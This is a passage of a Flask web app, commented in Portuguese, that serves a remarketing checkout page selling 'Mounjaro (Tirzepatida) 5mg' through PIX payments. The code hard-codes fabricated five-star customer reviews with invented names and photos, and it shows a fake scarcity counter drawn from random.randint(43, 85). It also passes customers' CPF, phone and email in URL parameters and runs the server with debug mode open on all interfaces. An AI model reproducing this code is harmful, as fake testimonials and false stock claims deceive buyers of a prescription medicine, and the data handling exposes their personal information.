            pix_code = payment_data.get('pix_code') or payment_data.get('copy_paste') or ''
            qr_code_url = payment_data.get('pix_qr_code') or payment_data.get('qr_code_image') or ''
            
            # Verificar se temos os dados necessários do pagamento
            if not pix_code and 'payment' in payment_data and isinstance(payment_data['payment'], dict):
                pix_code = payment_data['payment'].get('pix_code') or payment_data['payment'].get('copy_paste') or ''
                qr_code_url = payment_data['payment'].get('pix_qr_code') or payment_data['payment'].get('qr_code_image') or ''
            
            print(f"[REMARKETING] PIX code encontrado: {pix_code}")
            print(f"[REMARKETING] QR code URL encontrado: {qr_code_url}")
            
            # Se não temos os dados de pagamento, tentar gerar um novo pagamento
            if not pix_code or not qr_code_url:
                print(f"[REMARKETING] Dados de PIX não encontrados, gerando novo pagamento...")
                
                # Usar informações da URL ou padrão
                customer_name = request.args.get('nome', 'Cliente')
                customer_cpf = request.args.get('cpf', '')
                customer_phone = request.args.get('phone', '')
                customer_email = request.args.get('email', '')
                
                # Gerar novo pagamento PIX para o cliente
                payment_data = {
                    'name': customer_name,
                    'cpf': customer_cpf,
                    'phone': customer_phone,
                    'email': customer_email,
                    'amount': 143.10,  # Valor padrão do produto
                    'product_name': 'Mounjaro (Tirzepatida) 5mg'
                }
                
                # Criar novo pagamento
                new_payment = api.create_pix_payment(payment_data)
                print(f"[REMARKETING] Novo pagamento gerado: {new_payment}")
                
                # Extrair dados do novo pagamento
                transaction_id = new_payment.get('id') or transaction_id
                
                # Extrair PIX code e QR code conforme o gateway
                if gateway_choice == 'FOR4':
                    pix_code = new_payment.get('pixCode', '')
                    qr_code_url = new_payment.get('pixQrCode', '')
                else:
                    pix_code = new_payment.get('pix_code') or new_payment.get('copy_paste') or ''
                    qr_code_url = new_payment.get('pix_qr_code') or new_payment.get('qr_code_image') or ''
            
            # Extrair ou criar dados do cliente
            customer_name = payment_data.get('name', request.args.get('nome', 'Cliente'))
            customer_cpf = payment_data.get('cpf', request.args.get('cpf', ''))
            customer_phone = payment_data.get('phone', request.args.get('phone', ''))
            customer_email = payment_data.get('email', request.args.get('email', ''))
            
            # Criar objeto de cliente para o template
            customer = {
                'transaction_id': transaction_id,
                'customer_name': customer_name,
                'customer_cpf': customer_cpf,
                'customer_phone': customer_phone,
                'customer_email': customer_email,
                'product_name': 'Mounjaro (Tirzepatida) 5mg',
                'amount': 143.10
            }
            
            # Buscar compras no banco de dados para reviews (se disponível)
            database_url = os.environ.get('DATABASE_URL')
            if database_url:
                try:
                    from models import Purchase
                    # Buscar algumas compras para exibir como reviews (limitado a 5)
                    reviews = Purchase.query.filter(
                        Purchase.status == 'completed'  # Apenas compras concluídas
                    ).order_by(Purchase.created_at.desc()).limit(5).all()
                    print(f"[REMARKETING] Reviews encontrados: {len(reviews)}")
                except Exception as db_error:
                    print(f"[REMARKETING] Erro ao buscar reviews: {str(db_error)}")
            
        except Exception as gateway_error:
            print(f"[REMARKETING] ERRO ao consultar gateway: {str(gateway_error)}")
            app.logger.error(f"[REMARKETING] Erro ao consultar gateway: {str(gateway_error)}")
            # Usar dados padrão em vez de redirecionar
            customer = default_customer
        
        # Configurar estoque restante para remarketing (entre 43 e 85 unidades)
        import random
        remaining_stock = random.randint(43, 85)
        
        # Adicionar reviews positivos com menções sobre refrigeração e condição do produto
        if not 'reviews' in locals() or not reviews:
            reviews = []
            
        # Verificamos se temos reviews, senão criamos alguns predefinidos
        if not reviews:
            reviews = [
                {
                    'customer_name': 'Roberto Oliveira',
                    'created_at': '2025-04-20',
                    'rating': 5,
                    'comment': 'Produto chegou muito bem refrigerado, embalagem perfeita. O efeito começou a ser notado na segunda semana. Muito satisfeito!',
                    'profile_image': '/attached_assets/homem1.jpeg'
                },
                {
                    'customer_name': 'Carla Mendes',
                    'created_at': '2025-04-18',
                    'rating': 5,
                    'comment': 'Chegou refrigerado como prometido. Recebi em menos de 24h e o entregador manteve o produto na temperatura adequada. Já comecei o tratamento e estou animada.',
                    'profile_image': '/attached_assets/mulher1.jpeg'
                },
                {
                    'customer_name': 'Francisco Santos',
                    'created_at': '2025-04-15',
                    'rating': 5,
                    'comment': 'A embalagem térmica garantiu que o medicamento chegasse na temperatura correta. Já estou usando há duas semanas e os resultados são impressionantes!',
                    'profile_image': '/attached_assets/homem2.jpeg'
                },
                {
                    'customer_name': 'Maria Helena Costa',
                    'created_at': '2025-04-12',
                    'rating': 5, 
                    'comment': 'Fiquei impressionada com o cuidado na entrega. Produto refrigerado corretamente, lacrado e com validade longa. Recomendo!',
                    'profile_image': '/attached_assets/mulher2.jpeg'
                },
                {
                    'customer_name': 'Pedro Almeida',
                    'created_at': '2025-04-10',
                    'rating': 5,
                    'comment': 'Ótima experiência! O produto veio refrigerado com gelo seco e termômetro indicando temperatura correta. Já notei diferença após 10 dias de uso.',
                    'profile_image': '/attached_assets/homem3.jpeg'
                },
                {
                    'customer_name': 'Juliana Martins',
                    'created_at': '2025-04-08',
                    'rating': 5,
                    'comment': 'Chegou dentro do prazo, bem refrigerado e em perfeito estado. Atendimento excelente e produto de qualidade comprovada!',
                    'profile_image': '/attached_assets/mulher3.jpeg'
                },
                {
                    'customer_name': 'Ana Paula Silva',
                    'created_at': '2025-04-05',
                    'rating': 5,
                    'comment': 'A embalagem térmica é excelente, manteve a temperatura ideal. O produto está intacto e já comecei a usar. Muito satisfeita com a compra!',
                    'profile_image': '/attached_assets/mulher4.jpeg'
                }
            ]
        
        # Extrair dados UTM da URL para preservar a atribuição
        utm_params = {
            'utm_source': request.args.get('utm_source', 'remarketing'),
            'utm_medium': request.args.get('utm_medium', 'email'),
            'utm_campaign': request.args.get('utm_campaign', 'follow_up'),
            'utm_content': request.args.get('utm_content', 'segunda_chance'),
            'utm_term': request.args.get('utm_term', '')
        }
        
        print(f"[REMARKETING] Renderizando página para cliente: {customer.get('customer_name')}")
        
        # Passar dados para o template
        return render_template(
            'remarketing_product.html',
            customer=customer,
            reviews=reviews,
            remaining_stock=remaining_stock,
            utm_params=utm_params,
            pix_code=pix_code,
            qr_code_url=qr_code_url,
            transaction_id=transaction_id
        )
    
    except Exception as e:
        print(f"[REMARKETING] ERRO CRÍTICO na página de remarketing: {str(e)}")
        app.logger.error(f"[REMARKETING] Erro ao acessar página de remarketing: {str(e)}")
        # Usar um template de erro em vez de retornar JSON
        return render_template('error.html', error_message="Erro ao carregar a página de remarketing. Por favor, tente novamente mais tarde."), 500


# Função para salvar compra no banco de dados (utilizada nas rotas de confirmação de pagamento)
def save_purchase_to_db(transaction_id, amount, product_name='Produto'):
    """
    Salva os dados de compra no banco de dados para uso em remarketing
    """
    if not database_url:
        app.logger.warning("[DB] Banco de dados não configurado. Não foi possível salvar a compra.")
        return False

    try:
        # Importar o modelo Purchase
        from models import Purchase
        
        # Verificar se já existe uma compra com este transaction_id
        existing_purchase = Purchase.query.filter_by(transaction_id=transaction_id).first()
        if existing_purchase:
            app.logger.info(f"[DB] Compra com transaction_id {transaction_id} já existe no banco de dados.")
            return True
        
        # Obter dados do cliente
        customer_name = session.get('nome', '') or session.get('customer_name', '')
        customer_cpf = session.get('cpf', '') or session.get('customer_cpf', '')
        customer_phone = session.get('phone', '') or session.get('customer_phone', '')
        customer_email = session.get('email', '') or session.get('customer_email', '')
        
        # Obter UTM params da sessão
        utm_source = session.get('utm_source', '')
        utm_medium = session.get('utm_medium', '')
        utm_campaign = session.get('utm_campaign', '')
        utm_content = session.get('utm_content', '')
        utm_term = session.get('utm_term', '')
        fbclid = session.get('fbclid', '')
        gclid = session.get('gclid', '')
        
        # Obter informações do dispositivo
        device_type = 'mobile' if request.user_agent.platform in ['iphone', 'android'] else 'desktop'
        user_agent = request.user_agent.string
        
        # Criar a transação no banco de dados
        new_purchase = Purchase(
            transaction_id=transaction_id,
            customer_name=customer_name,
            customer_cpf=customer_cpf,
            customer_phone=customer_phone,
            customer_email=customer_email,
            product_name=product_name,
            amount=float(amount),
            status='completed',
            utm_source=utm_source,
            utm_medium=utm_medium,
            utm_campaign=utm_campaign,
            utm_content=utm_content,
            utm_term=utm_term,
            fbclid=fbclid,
            gclid=gclid,
            device_type=device_type,
            user_agent=user_agent
        )
        
        # Salvar no banco de dados
        db.session.add(new_purchase)
        db.session.commit()
        
        app.logger.info(f"[DB] Compra salva no banco de dados com ID: {new_purchase.id}")
        return True
    
    except Exception as e:
        app.logger.error(f"[DB] Erro ao salvar compra no banco de dados: {str(e)}")
        return False


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)